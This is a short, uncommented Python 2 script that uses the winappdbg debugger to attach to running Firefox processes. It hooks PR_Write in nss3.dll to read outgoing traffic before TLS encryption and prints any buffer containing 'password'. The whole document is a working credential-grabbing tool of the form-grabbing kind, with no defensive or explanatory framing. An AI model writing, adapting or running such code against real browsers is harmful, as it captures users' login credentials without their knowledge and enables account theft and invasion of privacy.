from winappdbg import Debug, EventHandler, win32, EventSift


class FirefoxSoftHookEventHandler(EventHandler):

    apiHooks = {
        "nss3.dll": [
            ("PR_Write", (win32.PVOID, win32.PVOID, win32.DWORD32))
        ]
    }

    def pre_PR_Write(self, evt, ra, fd, buf, amount):
        proc = evt.get_process()
        data = proc.read(buf, amount)

        if "password" in data:
            print "[+] %s" % data


handler = EventSift(FirefoxSoftHookEventHandler)

with Debug(handler, bKillOnExit=False) as debug:
    found_ff = False
    debug.system.scan()

    for (proc, name) in debug.system.find_processes_by_filename("firefox.exe"):
        pid = proc.get_pid()
        debug.attach(pid)
        print "[*] attached debugger to firefox: %d" % pid
        found_ff = True

    if found_ff:
        try:
            print "[*] monitoring CTRL-C to exit"
            debug.loop()
        except KeyboardInterrupt:
            print "[!] exiting..."
        finally:
            debug.stop()
    else:
        print "[!] could not find firefox process :("
